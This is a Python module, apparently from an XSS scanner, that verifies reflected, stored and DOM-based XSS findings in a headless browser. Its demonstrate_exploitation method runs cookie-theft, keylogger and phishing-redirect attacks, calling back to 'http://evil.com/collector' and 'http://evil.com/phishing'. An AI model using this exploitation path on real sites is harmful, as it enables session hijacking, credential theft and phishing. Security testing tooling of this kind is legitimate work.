"""
XSS Vulnerability Verifier Module
"""

from typing import Dict, List, Optional, Any
from .browser import BrowserEnvironment
from ..utils.http import HTTPHandler


class Verifier:
    def __init__(self, browser: str = 'chrome', headless: bool = True):
        self.browser_env = BrowserEnvironment(browser=browser, headless=headless)
        self.http = HTTPHandler()
        self.verified_vulnerabilities = []

    def verify_vulnerability(self, vuln: Dict, target_url: str) -> Dict:
        result = {
            'original_vuln': vuln,
            'verified': False,
            'verification_details': {}
        }

        if not self.browser_env.start():
            result['error'] = 'Failed to start browser'
            return result

        try:
            if vuln['type'] == 'reflected':
                result = self._verify_reflected(vuln, target_url)
            elif vuln['type'] == 'stored':
                result = self._verify_stored(vuln, target_url)
            elif vuln['type'] == 'dom':
                result = self._verify_dom(vuln, target_url)

        except Exception as e:
            result['error'] = str(e)
        finally:
            self.browser_env.stop()

        return result

    def _verify_reflected(self, vuln: Dict, target_url: str) -> Dict:
        result = {
            'original_vuln': vuln,
            'verified': False,
            'verification_details': {}
        }

        payload = vuln['payload']
        param = vuln['parameter']
        test_url, _ = self.http.inject_payload_in_url(target_url, param, payload)

        browser_result = self.browser_env.verify_xss(test_url, payload, param)
        result['verified'] = browser_result.get('verified', False)
        result['verification_details'] = browser_result

        if result['verified']:
            vuln['verified'] = True
            self.verified_vulnerabilities.append(vuln)

        return result

    def _verify_stored(self, vuln: Dict, target_url: str) -> Dict:
        result = {
            'original_vuln': vuln,
            'verified': False,
            'verification_details': {}
        }

        storage_url = vuln.get('storage_url', target_url)
        payload = vuln['payload']

        browser_result = self.browser_env.verify_xss(storage_url, payload, vuln['parameter'])
        result['verified'] = browser_result.get('verified', False)
        result['verification_details'] = browser_result

        if result['verified']:
            vuln['verified'] = True
            self.verified_vulnerabilities.append(vuln)

        return result

    def _verify_dom(self, vuln: Dict, target_url: str) -> Dict:
        result = {
            'original_vuln': vuln,
            'verified': False,
            'verification_details': {}
        }

        payload = vuln['payload']
        test_url = f"{target_url}#{payload.replace('alert(1)', '')}"

        browser_result = self.browser_env.verify_xss(test_url, payload, 'location.hash')
        result['verified'] = browser_result.get('verified', False)
        result['verification_details'] = browser_result

        if result['verified']:
            vuln['verified'] = True
            self.verified_vulnerabilities.append(vuln)

        return result

    def verify_batch(self, vulnerabilities: List[Dict], target_url: str) -> List[Dict]:
        results = []
        for vuln in vulnerabilities:
            result = self.verify_vulnerability(vuln, target_url)
            results.append(result)
        return results

    def demonstrate_exploitation(self, vuln: Dict, target_url: str, exploit_type: str = 'cookie_theft') -> Dict:
        result = {
            'vuln': vuln,
            'exploit_type': exploit_type,
            'success': False
        }

        if not self.browser_env.start():
            result['error'] = 'Failed to start browser'
            return result

        try:
            payload = vuln['payload']
            param = vuln['parameter']
            callback_url = "http://evil.com/collector"

            if exploit_type == 'cookie_theft':
                result = self.browser_env.verify_cookie_theft(target_url, payload, param, callback_url)
            elif exploit_type == 'keylogger':
                result = self.browser_env.verify_keylogger(target_url, payload, param, callback_url)
            elif exploit_type == 'redirect':
                result = self.browser_env.verify_page_redirect(target_url, payload, param, "http://evil.com/phishing")

        except Exception as e:
            result['error'] = str(e)
        finally:
            self.browser_env.stop()

        return result

    def get_verified_vulnerabilities(self) -> List[Dict]:
        return self.verified_vulnerabilities

    def cleanup(self):
        self.browser_env.stop()
